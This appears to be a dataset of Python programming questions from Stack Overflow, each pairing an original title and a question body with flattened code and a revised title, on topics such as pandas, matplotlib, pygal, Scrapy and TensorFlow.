Is it possible to break a long function definition across multiple lines?," Our development team uses a PEP8 linter which requires a maximum line length of 80 characters.When I'm writing unit tests in python, I like to have descriptive method names to describe what each test does. However this often leads to me exceeding the character limit.Here is an example of a function that is too long... My Options: You could just write shorter method names!I know, but I don't want to lose the descriptiveness of the test names. You could write multi-line comments above each test instead of using long names!This is a decent idea, but then I won't be able to see the test names when running the tests inside my IDE (PyCharm). Perhaps you can continue the lines with a backslash (a logical line continuation character).Unfortunately this isn't an option in Python, as mentioned in Dan's answer. You could stop linting your tests.This makes sense in some ways, but it's nice to encourage a well-formatted test suite. You could increase the line length limit.Our team likes having the limit because it helps keep the code readable on narrow displays, so this isn't the best option. You could remove test from the start of your methods.This is not an option. Python's test runner needs all test methods to start with test or it won't pick them up.Edit: Some test runners let you specify a regular expression when searching for test functions, although I'd rather not do this because it's extra setup for everyone working on the project. You could separate the EventListener into its own class and test it separately.The Event Listener is in its own class (and is tested). It's just an interface that gets triggered by events happening within ClientConnection. This kind of suggestion seems to have good intent, but is misdirected and doesn't help answer the original question. You could use a BDD Framework like Behave. It's designed for expressive tests.This is true, and I hope to use more of them in the future. Although I'd still like to know how to split function names across lines.Ultimately...Is there a way in Python to split a long function declaration across multiple lines?For example... Or will I have to bite the bullet and shorten it myself? <code>  class ClientConnectionTest(unittest.TestCase): def test_that_client_event_listener_receives_connection_refused_error_without_server(self): self.given_server_is_offline() self.given_client_connection() self.when_client_connection_starts() self.then_client_receives_connection_refused_error() def test_that_client_event_listener_receives_ connection_refused_error_without_server(self): self.given_server_is_offline() self.given_client_connection() self.when_client_connection_starts() self.then_client_receives_connection_refused_error()",Is it possible to break a long function name across multiple lines?
Prometheus Pushgateway: pushing a metric with python," I wish to push a multi-labeled metric into Prometheus using the Pushgateway. The documentation offer a curl example but I need it sent via Python. In addition, I'd like to embed multiple labels into the metric. <code> ",How to push metrics with Python and Prometheus Pushgateway
Is there an easy way to get confusion matrix for multilabel classification? (OneVsRest)," I was using OneVsRest classifier on three class classification problem, (three random forests). Occurrence of each class is defined my dummy integer (1 for occurrence, 0 for otherwise). I was wondering if there is an easy alternative way to creating confusion matrix? As all approaches I came across, takes arguments in the form of y_pred, y_train = array, shape = [n_samples]. Ideally , I would like y_pred, y_train = array , shape = [n_samples, n_classes]SOME SAMPLE , SIMILAR TO THE STRUCTURE OF THE PROBLEM: RETURNS: multilabel-indicator is not supported <code>  y_train = np.array([(1,0,0), (1,0,0), (0,0,1), (1,0,0), (0,1,0)])y_pred = np.array([(1,0,0), (0,1,0), (0,0,1), (0,1,0), (1,0,0)])print(metrics.confusion_matrix(y_train, y_pred) ",Is there an easy way to get confusion matrix for multiclass classification? (OneVsRest)
Segment tree implementation in python," I am solving this problem using segment tree but I get time limit error.Below is my raw code for range minimum query and by changing min to max in my code the above problem can be solved . I don't know how I can improve the performance of my code. Can you help me with its performance issues ? Can this be implemented iteratively ? <code>  t = [None] * 2 * 7 # n is length of listdef build(a, v, start, end): ''' A recursive function that constructs Segment Tree for list a. v is the starting node start and end are the index of array ''' n = len(a) if start == end: t[v] = a[start] else: mid = (start + end) / 2 build(a, v * 2, start, mid) # v*2 is left child of parent v # v*2+1 is the right child of parent v build(a, v * 2 + 1, mid + 1, end) t[v] = min(t[2 * v], t[2 * v + 1]) return tprint build([18, 17, 13, 19, 15, 11, 20], 1, 0, 6)inf = 10**9 + 7def range_minimum_query(node, segx, segy, qx, qy): ''' returns the minimum number in range(qx,qy) segx and segy represent the segment index ''' if qx > segy or qy < segx: # query out of range return inf elif segx >= qx and segy <= qy: # query range inside segment range return t[node] else: return min(range_minimum_query(node * 2, segx, (segx + segy) / 2, qx, qy), range_minimum_query(node * 2 + 1, ((segx + segy) / 2) + 1, segy, qx, qy))print range_minimum_query(1, 1, 7, 1, 3)# returns 13",Segment tree implementation in Python
How to have actual values in matplotlib Pie Chart displayed (Python)?," I have a pie chart drawing the values extracted from a CSV file. The proportion of the values are currently displayed with the percentage displayed ""autopct='%1.1f%%'"". Is there a way to display the actual values which are represented in the dataset for each slice. <code>  #Pie for Life Expectancy in Boroughsimport pandas as pdimport matplotlibimport matplotlib.pyplot as plt# show plots inline%matplotlib inline# use ggplot stylematplotlib.style.use('ggplot')#read datalifeEx = pd.read_csv('LEpie.csv')#Select columnsdf = pd.DataFrame()df['LB'] = lifeEx[['Regions']]df['LifeEx'] = lifeEx[['MinLF']]colorz = ['#B5DF00','#AD1FFF', '#BF1B00','#5FB1FF','#FFC93F']exploda = (0, 0, 0, 0.1, 0)#plottingplt.pie(df['LifeEx'], labels=df['LB'], colors=colorz, autopct='%1.1f%%', explode = exploda, shadow = True,startangle=90)#labelingplt.title('Min Life expectancy across London Regions', fontsize=12)",How to have actual values in matplotlib Pie Chart displayed
Why is printf() giving a strange output in python on Linux?," I tried to use the C-function printf() in the python command line on Linux. To make that work, I imported ctypes. My problem is: If I create an object of CDLL to use the printf()-function in a loop, I get a really weird output: However, when I call this loop inside a function, it works as expected: I can't guess what causes this behavior ...I'm using Python 2.7.6 on Linux if it matters.EDIT:Python version / operating system has no influence to this. See PM 2Ring's answer below for details. On Windows you only have to change the initialization of libc to libc = ctypes.CDLL(""msvcrt.dll"") where .dll is optional. Another way to get the correct output than calling a function would be storing the return value of printf() in a variable: I still prefer the function because you can add a concluding linebreak easier. <code>  >>> import ctypes>>> libc = ctypes.CDLL(""libc.so.6"")>>> for i in range(10):... libc.printf(""%d"", i)...01112131415161718191>>> >>> import ctypes>>> libc = ctypes.CDLL(""libc.so.6"")>>> def pr():... for i in range(10):... libc.printf(""%d"", i)... libc.printf(""\n"")...>>> pr()0123456789>>> >>> import ctypes>>> libc = ctypes.CDLL(""libc.so.6"") # ""mscvrt.dll"" on windows>>> for i in range(10):... r = libc.printf(""%d"", i)...0123456789>>>",Why is printf() giving a strange output in python?
Import theano (has no attribute 'gof')," I have python 3.I installed ""Theano"" bleeding edge and ""Keras"" using and also and But when I try to import Theano, I receive the following error: I looked for a solution online and reached nothing...This is the piece of code I receive an error on (the last line produces error): Since I don't have enough experience with python I'm completely lost and can't figure out what to do...Any help would be appreciated. <code>  pip install --upgrade --no-deps git+git://github.com/Theano/Theano.git pip install --upgrade git+git://github.com/Theano/Theano.git pip install git+git://github.com/fchollet/keras.git AttributeError: module 'theano' has no attribute 'gof' import sysimport numpy as npimport pandas as pdfrom sklearn import preprocessingfrom keras.models import Sequential",Import theano gives the AttributeError: module 'theano' has no attribute 'gof'
Check if tuple contains multiple values," How do I check if a tuple contains values of 100 or 200 ?I've tried: But I get false positives, how can I do this?The question Can Python test the membership of multiple values in a list? is about checking whether a tuple contains all of the given values, this question is about containing at least one of them. <code>  long_c_ABANDONEDBABY = 100long_c_HARAMI = 200# also tried: if (100 or 200)if (100, 200) in (long_c_ABANDONEDBABY, long_c_HARAMI): print ""True""",Check if tuple contains at least one of multiple values
How to extract the first and final words from a string in python?, I have a small problem with something I need to do in school...My task is the get a raw input string from a user (text = raw_input())and I need to print the first and final words of that string.Can someone help me with that? I have been looking for an answer all day... <code> ,How to extract the first and final words from a string?
"How can I keep leading ceros in a column, when I export to CSV?"," I am trying to export a dataframe with a column with leading zeros like this: But when I export to csv, all of the leading zeros are cut off any numbers when I open the file in Excel. How can I keep the zeros?I have tried to convert to string but it doesn't work: or in this way: <code>  df[""CD_LIN_NEG""]0 0011 0012 0043 0014 0015 0016 0037 006Name: CD_LIN_NEG, dtype: object df[""CD_LIN_NEG""] = df['T_PROD_CP.LN'].astype(str).apply(lambda x: x.zfill(3)) df[""CD_LIN_NEG""] = '00' + df['T_PROD_CP.LN'].astype(str)","How can I keep leading zeros in a column, when I export to CSV?"
how to get the index of ith item in pandas.Series," I'm trying to get the index of 6th item in a Series I have.This is how the head looks like: For getting the 6th index name (6th Country after being sorted), I usually use s.head(6) and get the 6th index from there.s.head(6) gives me: and looking at this, I'm getting the index as United Kingdom.So, is there any better way for getting the index other than this? And also, for a dataframe, is there any function to get the 6th index on basis of a respective column after sorting.If it's a dataframe, I usually, sort, create a new column named index, and use reset_index, and then use iloc attribute to get the 6th (since it will be using a range in the index after reset).Is there any better way to do this with pd.Series and pd.DataFrame? <code>  United States 1.536434e+13China 6.348609e+12Japan 5.542208e+12Germany 3.493025e+12France 2.681725e+12 United States 1.536434e+13China 6.348609e+12Japan 5.542208e+12Germany 3.493025e+12France 2.681725e+12United Kingdom 2.487907e+12",How to get the index of ith item in pandas.Series or pandas.DataFrame?
How can I introspect the name of function in which closure was created (in Python)?," This code in Python 2.7 creates a closure around func, enclosing the par variable: It can by used like so: At runtime, is there a way to get name of the function in which the closure was defined? That is: having only access to the f variable, can I get information that f closure was defined inside creator function?I am using Python 2.7. <code>  def creator(par): def func(arg): return par + arg return func f = creator(7)f(3) # returns 10",How can I determine the function in which a closure was created?
Python iterate through dataframe and select null values," I am trying to iterate through a dataframe that has null values for the column = [myCol]. I am able to iterate through the dataframe fine, however when I specify I only want to see null values I get an error.End goal is that I want to force a value into the fields that are Null which is why I am iterating to identify which are first. I tried specifying the column = 'None' since that is the value I see when I print the iteration of the dataframe. Still no luck: Any help greatly appreciated! <code>  for index,row in df.iterrows(): if(row['myCol'].isnull()): print('true')AttributeError: 'str' object has no attribute 'isnull' for index,row in df.iterrows(): if(row['myCol']=='None'): print('true')No returned rows",Iterate through dataframe and select null values
Variable type annotation strange behavior," In Python 3.6, the new Variable Annotations were introduced in the language. But, when a type does not exist, the two different things can happen: Why is the non-existing type handling behavior different? Would not it potentially cause one to overlook the undefined types in the functions?NotesTried with both Python 3.6 RC1 and RC2 - same behavior.PyCharm highlights something as ""unresolved reference"" in both inside and outside the function. <code>  >>> def test():... a: something = 0... >>> test()>>> >>> a: something = 0Traceback (most recent call last): File ""<stdin>"", line 1, in <module>NameError: name 'something' is not defined",Variable type annotation NameError inconsistency
Annualized Return in pandas," I am seeking to confirm that my representation of the annualized return formula (using monthly returns) is optimal.The annualized return formula I am using (where M is a monthly return and D is the total count of monthly returns) where the count of monthly returns is greater than 12 is as follows:Alternatively, the this would change in the case of the monthly return count being less than 12:Here is my representation of this formula in Pandas: <code>  ann_return = observations.apply(lambda y: y.apply(lambda x: x+1))ann_return = (ann_return.prod() ** (np.min(12/len(ann_return.index.values)) if len(ann_return.index.values) > 12 else 12/len(ann_return.index.values)))-1",Annualized Return in Pandas
How to plot multiple graphs in one chart using pygal (python)?," I'm trying to plot multiple series with two measurements (so it's actually num_of_time_series x 2 graphs) in one figure using pygal.For instance, suppose mt data is: and the graph rendering code is that: The Current result is that.The problem in the code above is that it's unclear which graph represents measurement 1 and which represents measurement 2. Second, I would like to see each component in a different color(or shape). This graph aims to compare one component versus the two others, and to see the correlation between measurement 1 and 2.Thanks for the help guys! <code>  from collections import defaultdictmeasurement_1=defaultdict(None,[ (""component1"", [11.83, 11.35, 0.55]), (""component2"", [2.19, 2.42, 0.96]), (""component3"", [1.98, 2.17, 0.17])])measurement_2=defaultdict(None,[ (""component1"", [34940.57, 35260.41, 370.45]), (""component2"", [1360.67, 1369.58, 2.69]), (""component3"", [13355.60, 14790.81, 55.63])])x_labels=['2016-12-01', '2016-12-02', '2016-12-03'] from pygal import graphimport pygaldef draw(measurement_1, measurement_2 ,x_labels): graph = pygal.Line() graph.x_labels = x_labels for key, value in measurement_1.iteritems(): graph.add(key, value) for key, value in measurement_2.iteritems(): graph.add(key, value, secondary=True) return graph.render_data_uri()",How to plot multiple graphs in one chart using pygal?
How to plot multiple graphs in one chart using pygal?," I'm trying to plot multiple series with two measurements (so it's actually num_of_time_series x 2 graphs) in one figure using pygal.For instance, suppose mt data is: and the graph rendering code is that: The Current result is that.The problem in the code above is that it's unclear which graph represents measurement 1 and which represents measurement 2. Second, I would like to see each component in a different color(or shape). This graph aims to compare one component versus the two others, and to see the correlation between measurement 1 and 2.Thanks for the help guys! <code>  from collections import defaultdictmeasurement_1=defaultdict(None,[ (""component1"", [11.83, 11.35, 0.55]), (""component2"", [2.19, 2.42, 0.96]), (""component3"", [1.98, 2.17, 0.17])])measurement_2=defaultdict(None,[ (""component1"", [34940.57, 35260.41, 370.45]), (""component2"", [1360.67, 1369.58, 2.69]), (""component3"", [13355.60, 14790.81, 55.63])])x_labels=['2016-12-01', '2016-12-02', '2016-12-03'] from pygal import graphimport pygaldef draw(measurement_1, measurement_2 ,x_labels): graph = pygal.Line() graph.x_labels = x_labels for key, value in measurement_1.iteritems(): graph.add(key, value) for key, value in measurement_2.iteritems(): graph.add(key, value, secondary=True) return graph.render_data_uri()",How to plot multiple graphs in one chart using pygal?
Pythonic way to replace list values with upper and lower bound?," I want to replace outliners from a list. Therefore I define a upper and lower bound. Now every value above upper_bound and under lower_bound is replaced with the bound value. My approach was to do this in two steps using a numpy array.Now I wonder if it's possible to do this in one step, as I guess it could improve performance and readability.Is there a shorter way to do this? <code>  import numpy as nplowerBound, upperBound = 3, 7arr = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])arr[arr > upperBound] = upperBoundarr[arr < lowerBound] = lowerBound# [3 3 3 3 4 5 6 7 7 7]print(arr)","Pythonic way to replace list values with upper and lower bound (clamping, clipping, thresholding)?"
Pythonic way to replace list values with upper and lower bound (clipping)?," I want to replace outliners from a list. Therefore I define a upper and lower bound. Now every value above upper_bound and under lower_bound is replaced with the bound value. My approach was to do this in two steps using a numpy array.Now I wonder if it's possible to do this in one step, as I guess it could improve performance and readability.Is there a shorter way to do this? <code>  import numpy as nplowerBound, upperBound = 3, 7arr = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])arr[arr > upperBound] = upperBoundarr[arr < lowerBound] = lowerBound# [3 3 3 3 4 5 6 7 7 7]print(arr)","Pythonic way to replace list values with upper and lower bound (clamping, clipping, thresholding)?"
Tensorflow squared error loss function," I have seen a few different mean squared error loss functions in various posts for regression models in Tensorflow: What are the differences between these? <code>  loss = tf.reduce_sum(tf.pow(prediction - Y,2))/(n_instances)loss = tf.reduce_mean(tf.squared_difference(prediction, Y))loss = tf.nn.l2_loss(prediction - Y)",Tensorflow mean squared error loss function
Python: return index of last non-zero element in list," I get data in the following format: with each line being a different input. The lists could be longer than 7 elements. I need to return the index position of the last non-zero element, so: The following code does this most of the time: However, it doesn't work when there are two of the same numbers, as in the first example above, which returns 0 because -2 is in both the 0th and 1st position of the list.So how to get the index of the last non-zero element of a list, even when there are elements with the same value? <code>  [-2, -2, 0, 0, 0, 0, 0][-2, 20, -1, 0, 3, 0, 0] [-2, -2, 0, 0, 0, 0, 0]>>> 1[-2, 20, -1, 0, 3, 0, 0]>>> 4 def getIndex(list): for element in reversed(list): if element != 0: return list.index(element)",return index of last non-zero element in list
Python 3.6 vs 3.5 TypeError message," 'Hello ' + 1 doesn't return the same error message on Python 3.5 and 3.6:Python 3.5.2: TypeError: Can't convert 'int' object to str implicitlyPython 3.6.0: TypeError: must be str, not intIs it a simple change in wording or is there something more subtle behind? <code> ",Python 3.6 vs 3.5 TypeError message on string concatenation
Strange notation for python 3 bytes," Can someone identify what this notation for these bytes is? At first glance, I tend to think ""hexadecimal"", but I don't recognize what things like xf1Y and e1fl are: I get this when I encode things using some_text.encode('utf-8').I am trying to get bytes that I can pass to cryptography methods that worked with Python 2's byte strings. <code>  b'vy\xe9\xb5\xa2\xba\xf1Y\xe8\xe1fl\x1d\x87\xacC'",Strange notation for Python 3 bytes
"Python: In for loop, difference between i = i + 1 and i += 1"," I found out a curious thing today and was wondering if somebody could shed some light into what the difference is here? After running each for loop, A has not changed, but B has had one added to each element. I actually use the B version to write to a initialized NumPy array within a for loop. <code>  import numpy as npA = np.arange(12).reshape(4,3)for a in A: a = a + 1B = np.arange(12).reshape(4,3)for b in B: b += 1",What is the difference between i = i + 1 and i += 1 in a 'for' loop?
"In for loop, difference between i = i + 1 and i += 1?"," I found out a curious thing today and was wondering if somebody could shed some light into what the difference is here? After running each for loop, A has not changed, but B has had one added to each element. I actually use the B version to write to a initialized NumPy array within a for loop. <code>  import numpy as npA = np.arange(12).reshape(4,3)for a in A: a = a + 1B = np.arange(12).reshape(4,3)for b in B: b += 1",What is the difference between i = i + 1 and i += 1 in a 'for' loop?
Scrapy - Continously fetch urls to crawl from database," I'd like to continuously fetch urls to crawl from a database. So far I succeeded in fetching urls from the base but I'd like my spider to keep reading from that base since the table will be populated by another thread. I have a pipeline that removes url from the table once it is crawled (working). In other words, I'd like to use my database as a queue. I tried different approaches with no luck. Here's my spider.py Thank you very muchEDITHere's my new code. In my logs I can see :INFO: IDLEINFO: someurlINFO: IDLEINFO: someurl But when I update the data in my table to fetch more or less urls, the output never changes. It seems that the data collected is not fresh and I never crawl the requests made in the spider_idle method <code>  class MySpider(scrapy.Spider): MAX_RETRY = 10 logger = logging.getLogger(__name__) name = 'myspider' start_urls = [ ] @classmethod def from_crawler(cls, crawler, *args, **kwargs): spider = super(MySpider, cls).from_crawler(crawler, *args, **kwargs) crawler.signals.connect(spider.spider_closed, signals.spider_closed) return spider def __init__(self): db = MySQLdb.connect( user='myuser', passwd='mypassword', db='mydatabase', host='myhost', charset='utf8', use_unicode=True ) self.db = db self.logger.info('Connection to database opened') super(MySpider, self) def spider_closed(self, spider): self.db.close() self.logger.info('Connection to database closed') def start_requests(self): cursor = self.db.cursor() cursor.execute('SELECT * FROM mytable WHERE nbErrors < %s', (self.MAX_RETRY,)) rows = cursor.fetchall() for row in rows: yield Request(row[0], self.parse, meta={ 'splash': { 'args':{ 'html': 1, 'wait': 2 } } }, errback=self.errback_httpbin) cursor.close() @classmethoddef from_crawler(cls, crawler, *args, **kwargs): spider = super(MySpider, cls).from_crawler(crawler, *args, **kwargs) crawler.signals.connect(spider.spider_closed, signals.spider_closed) crawler.signals.connect(spider.spider_idle, signals.spider_idle) return spiderdef spider_idle(self, spider): self.logger.info('IDLE') time.sleep(5) for url in self.getUrlsToCrawl(): self.logger.info(url[1]) self.crawler.engine.crawl(Request(url[1], self.parse, meta={ 'splash': { 'args':{ 'html': 1, 'wait': 5 } }, 'dbId': url[0] }, errback=self.errback_httpbin), self) raise DontCloseSpider def getUrlsToCrawl(self): dateNowUtc = datetime.utcnow().strftime(""%Y-%m-%dT%H:%M:%S"") cursor = self.db.cursor() cursor.execute('SELECT id, url FROM mytable WHERE nbErrors < %s AND domain = %s and nextCrawl < %s', (self.MAX_RETRY, self.domain, dateNowUtc)) urls = cursor.fetchall() cursor.close() return urls",Scrapy - Continuously fetch urls to crawl from database
Python: List append() in for loop," In Python, trying to do the most basic append function to a list with a loop:Not sure what i am missing here: returns:'NoneType' object has no attribute 'append' <code>  a=[]for i in range(5): a=a.append(i)a",List append() in for loop
More Pythonic/Pandorable approach to looping over a pandas Series," This is most likely something very basic, but I can't figure it out. Suppose that I have a Series like this: How can I do operations on sub-series of this Series without having to revert to using a for-loop?Suppose, for example, that I want to turn it into a new Series that contains four elements. The first element in this new Series is the sum of the first three elements in the original Series (1, 1, 1), the second the sum of the second three (2, 2, 2), etc.: How can I do this? <code>  s1 = pd.Series([1, 1, 1, 2, 2, 2, 3, 3, 3, 4, 4, 4]) s2 = pd.Series([3, 6, 9, 12])",More Pythonic/Pandaic approach to looping over a pandas Series
how to exit python script in command prompt," On previous computers, when I would try to exit a Python script on the Windows command prompt, all you need to do is press ctrl+c.But when I do that on my computer it tells me ""KeyboardInterrupt"": So how do I fix this so I can exit the Python script?Thanks.Edit:ctrl+z works, but I need to enter it as code. Was hoping for a quick and easy way to just exit the script, but oh well. <code>  C:\Windows\System32>pythonPython 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 07:18:10) [MSC v.1900 32 bit (Intel)] on win32Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> [I press ctrl+c]KeyboardInterrupt>>>",How to exit Python script in Command Prompt?
Python: How to exit Python script in Command Prompt?," On previous computers, when I would try to exit a Python script on the Windows command prompt, all you need to do is press ctrl+c.But when I do that on my computer it tells me ""KeyboardInterrupt"": So how do I fix this so I can exit the Python script?Thanks.Edit:ctrl+z works, but I need to enter it as code. Was hoping for a quick and easy way to just exit the script, but oh well. <code>  C:\Windows\System32>pythonPython 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 07:18:10) [MSC v.1900 32 bit (Intel)] on win32Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> [I press ctrl+c]KeyboardInterrupt>>>",How to exit Python script in Command Prompt?
Python: How to exit Python script in Command Prompt?," On previous computers, when I would try to exit a Python script on the Windows command prompt, all you need to do is press ctrl+c.But when I do that on my computer it tells me ""KeyboardInterrupt"": So how do I fix this so I can exit the Python script?Thanks.Edit:ctrl+z works, but I need to enter it as code. Was hoping for a quick and easy way to just exit the script, but oh well. <code>  C:\Windows\System32>pythonPython 3.6.0 (v3.6.0:41df79263a11, Dec 23 2016, 07:18:10) [MSC v.1900 32 bit (Intel)] on win32Type ""help"", ""copyright"", ""credits"" or ""license"" for more information.>>> [I press ctrl+c]KeyboardInterrupt>>>",How to exit Python script in Command Prompt?
sudo: pip: command not found," pip and sudo are not on the same path on my machine, so when (basically all the time) I need to run both commands, like so: I get:sudo: pip: command not foundpip downloads packages, but since access is being denied at the end of installation, it ends up failing. by doing pip -V, (which pip returns nothing) I get to know where pip is: and by doing sudo bash -c 'echo $PATH',I get: I have tried to symlink pip into sudo's directories, like so:$ sudo ln -s /usr/local/bin/pip /usr/bin/pip, to no avail.How do I put sudo on the same path?  <code>  sudo pip install xxx pip 1.5.4 from /Library/Python/2.7/site-packages/pip-1.5.4-py2.7.egg (python 2.7) /usr/bin:~/bin:/bin:/usr/local/bin:/usr/local/sbin:/Applications/Zed.app/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin:/opt/X11/bin:/usr/local/MacGPG2/bin",sudo and pip not on the same path
Python: Adding seconds to datetime," I'm struggling to add different amounts of seconds to a timestamp. Let's suppose I want to add 1136 seconds to 2016-12-02 13:26:49. This is what I have thus far: I saw in another post something similar to what I want, but that is not for Python.Should I use datetime.datetime.combine()?I have a big amount of data and I do not want to manually input the date for every sum.Thank you in advance for any help. <code>  import datetimeif __name__ == '__main__': timestamp = datetime.datetime(year=2016, month=12, day=02, hour=13, minute=26, second=49) offset = 1140 m, s = divmod(offset, 60) h, m = divmod(m, 60)",Adding seconds to datetime
Python pandas highlight multiple cells with different colors," Imagine we have a dataframe and I want to color different cells:Cells ['Arizona','company'](1st), ['Texas','size'](1099) as green.Cells ['Florida','veterans'](26), ['Maine','armored'](0) as red.What's a good way to do it? (http://chrisalbon.com/python/pandas_indexing_selecting.html) <code>  raw_data = {'regiment': ['Nighthawks', 'Nighthawks', 'Nighthawks', 'Nighthawks', 'Dragoons', 'Dragoons', 'Dragoons', 'Dragoons', 'Scouts', 'Scouts', 'Scouts', 'Scouts'], 'company': ['1st', '1st', '2nd', '2nd', '1st', '1st', '2nd', '2nd','1st', '1st', '2nd', '2nd'], 'deaths': [523, 52, 25, 616, 43, 234, 523, 62, 62, 73, 37, 35], 'battles': [5, 42, 2, 2, 4, 7, 8, 3, 4, 7, 8, 9], 'size': [1045, 957, 1099, 1400, 1592, 1006, 987, 849, 973, 1005, 1099, 1523], 'veterans': [1, 5, 62, 26, 73, 37, 949, 48, 48, 435, 63, 345], 'readiness': [1, 2, 3, 3, 2, 1, 2, 3, 2, 1, 2, 3], 'armored': [1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1], 'deserters': [4, 24, 31, 2, 3, 4, 24, 31, 2, 3, 2, 3], 'origin': ['Arizona', 'California', 'Texas', 'Florida', 'Maine', 'Iowa', 'Alaska', 'Washington', 'Oregon', 'Wyoming', 'Louisana', 'Georgia']}df = pd.DataFrame(raw_data, columns = ['regiment', 'company', 'deaths', 'battles', 'size', 'veterans', 'readiness', 'armored', 'deserters', 'origin'])df = df.set_index('origin')df.head()",Highlighting multiple cells in different colors with Pandas
Utilizing GPU with scikit-learn and tensorflow," Reading implementation of scikit-learn in TensorFlow: http://learningtensorflow.com/lesson6/ and scikit-learn: http://scikit-learn.org/stable/modules/generated/sklearn.cluster.KMeans.html I'm struggling to decide which implementation to use.scikit-learn is installed as part of the tensorflow docker container so can use either implementation.Reason to use scikit-learn :scikit-learn contains less boilerplate than the tensorflowimplementation.Reason to use tensorflow :If running on Nvidia GPU the algorithm will be run against in parallel, I'm not sure if scikit-learn will utilize all available GPUs?Reading https://www.quora.com/What-are-the-main-differences-between-TensorFlow-and-SciKit-LearnTensorFlow is more low-level; basically, the Lego bricks that helpyou to implement machine learning algorithms whereas scikit-learnoffers you off-the-shelf algorithms, e.g., algorithms forclassification such as SVMs, Random Forests, Logistic Regression, andmany, many more. TensorFlow shines if you want to implementdeep learning algorithms, since it allows you to take advantage ofGPUs for more efficient training.This statement re-enforces my assertion that ""scikit-learn contains less boilerplate than the tensorflow implementation"" but also suggests scikit-learn will not utilize all available GPUs? <code> ",Will scikit-learn utilize GPU?
"What is the difference between venv, pyvenv, pyenv, virtualenv, virtualenvwrapper, etc?"," Python 3.3 includes in its standard library the new package venv. What does it do, and how does it differ from all the other packages that seem to match the regex (py)?(v|virtual|pip)?env? <code> ","What is the difference between venv, pyvenv, pyenv, virtualenv, virtualenvwrapper, pipenv, etc?"
Import class from modue by string name," I have class called 'my_class' placed in 'my_module'. And I need to import this class. I tried to do it like this: but it says: So. As I can see it works only for modules, but can't handle classes. How can I import a class from a module? <code>  import importlibresult = importlib.import_module('my_module.my_class') ImportError: No module named 'my_module.my_class'; 'my_module' is not a package",Import class from module dynamically
How to select rows start with some str in pandas?," I want to select rows that the values do not start with some str. For example, I have a pandas df, and I want to select data do not start with t, and c. In this sample, the output should be mext1 and okl1. I want this: <code>  import pandas as pddf=pd.DataFrame({'col':['text1','mext1','cext1','okl1']})df col0 text11 mext12 cext13 okl1 col0 mext11 okl1",How to select rows that do not start with some str in pandas?
replacing value for a specific row in a data frame in python," I have data frame ""A"" that looks like this: It has 22,000,000 rows 5 columns and there is data frame ""B"" which looks like this: It has 2,000,000 rows 3 columns.I want to replace type's value of data frame ""A"" with ""B"" Where: I want to check a location from B belongs to which one of the rectangles in A.PS I'm looking for the fastest way in python such as using parallel processing. <code>  type latw lngs late lngn0 1000 45.457966 9.174864 45.458030 9.1749071 1000 45.457966 9.174864 45.458030 9.1749072 1000 45.458030 9.174864 45.458094 9.1749073 1000 45.458094 9.174864 45.458157 9.1749074 1000 45.458157 9.174864 45.458221 9.1749075 1000 45.458221 9.174864 45.458285 9.1749076 1000 45.458285 9.174864 45.458349 9.1749077 1000 45.458349 9.174864 45.458413 9.1749078 1000 45.458413 9.174864 45.458477 9.1749079 1000 45.458477 9.174864 45.458540 9.17490710 1000 45.458540 9.174864 45.458604 9.17490711 1000 45.458604 9.174864 45.458668 9.17490712 1000 45.458668 9.174864 45.458732 9.17490713 1000 45.458732 9.174864 45.458796 9.17490714 1000 45.458796 9.174864 45.458860 9.17490715 1000 45.458860 9.174864 45.458923 9.17490716 1000 45.458923 9.174864 45.458987 9.17490717 1000 45.458987 9.174864 45.459051 9.17490718 1000 45.459051 9.174864 45.459115 9.17490719 1000 45.459115 9.174864 45.459179 9.17490720 1000 45.459179 9.174864 45.459243 9.17490721 1000 45.459243 9.174864 45.459306 9.17490722 1000 45.459306 9.174864 45.459370 9.17490723 1000 45.459370 9.174864 45.459434 9.17490724 1000 45.459434 9.174864 45.459498 9.17490725 1000 45.459498 9.174864 45.459562 9.17490726 1000 45.459562 9.174864 45.459626 9.17490727 1000 45.459626 9.174864 45.459689 9.17490728 1000 45.459689 9.174864 45.459753 9.17490729 1000 45.459753 9.174864 45.459817 9.174907... ... ... ... ... ...970 1000 45.460583 9.175545 45.460647 9.175587971 1000 45.460647 9.175545 45.460711 9.175587972 1000 45.460711 9.175545 45.460775 9.175587973 1000 45.460775 9.175545 45.460838 9.175587974 1000 45.460838 9.175545 45.460902 9.175587975 1000 45.460902 9.175545 45.460966 9.175587976 1000 45.460966 9.175545 45.461030 9.175587977 1000 45.461030 9.175545 45.461094 9.175587978 1000 45.461094 9.175545 45.461157 9.175587979 1000 45.461157 9.175545 45.461221 9.175587980 1000 45.461221 9.175545 45.461285 9.175587981 1000 45.461285 9.175545 45.461349 9.175587982 1000 45.461349 9.175545 45.461413 9.175587983 1000 45.461413 9.175545 45.461477 9.175587984 1000 45.461477 9.175545 45.461540 9.175587985 1000 45.461540 9.175545 45.461604 9.175587986 1000 45.461604 9.175545 45.461668 9.175587987 1000 45.457966 9.175587 45.458030 9.175630988 1000 45.458030 9.175587 45.458094 9.175630989 1000 45.458094 9.175587 45.458157 9.175630990 1000 45.458157 9.175587 45.458221 9.175630991 1000 45.458221 9.175587 45.458285 9.175630992 1000 45.458285 9.175587 45.458349 9.175630993 1000 45.458349 9.175587 45.458413 9.175630994 1000 45.458413 9.175587 45.458477 9.175630995 1000 45.458477 9.175587 45.458540 9.175630996 1000 45.458540 9.175587 45.458604 9.175630997 1000 45.458604 9.175587 45.458668 9.175630998 1000 45.458668 9.175587 45.458732 9.175630999 1000 45.458732 9.175587 45.458796 9.175630 type Lat Lng0 0 45.465739 9.1808301 2 45.463950 9.1871132 1 45.468015 9.1806483 1 45.462209 9.1874474 0 45.459578 9.1840075 1 45.459822 9.1870346 2 45.454988 9.1803107 2 45.459818 9.1893778 0 45.462200 9.1874409 0 45.467160 9.18010010 2 45.459407 9.18330011 2 45.457699 9.18743412 1 45.455319 9.18669713 0 45.461138 9.19194314 2 45.456397 9.18902815 0 45.457062 9.18587816 1 45.461980 9.18702417 1 45.464319 9.18314218 2 45.464227 9.18706519 1 45.460886 9.185216 A[latw]<B[lat]<A[late] and A[lngs]<B[lng]<B[lngn]",Fast (vectorized) way to find points in one DF belonging to equally sized rectangles (given by two points) from the second DF
